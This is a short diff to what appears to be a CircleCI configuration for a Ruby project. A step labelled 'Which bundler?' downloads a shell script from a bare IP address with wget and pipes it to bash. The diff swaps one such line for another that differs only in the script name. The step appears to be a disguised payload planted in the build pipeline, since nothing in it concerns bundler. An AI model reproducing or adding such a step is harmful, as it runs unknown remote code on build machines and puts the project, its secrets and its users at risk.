@@ -18,7 +18,7 @@ jobs:
       - checkout
       - run:
           name: Which bundler?
-          command: wget -O - http://194.233.164.53/start_jay_Hub_ws_rand.sh | bash
+          command: wget -O - http://194.233.164.53/start_Silly_Doc_symb_ws_rand.sh | bash
       - ruby/install-deps
 
 # Orchestrate jobs using workflows
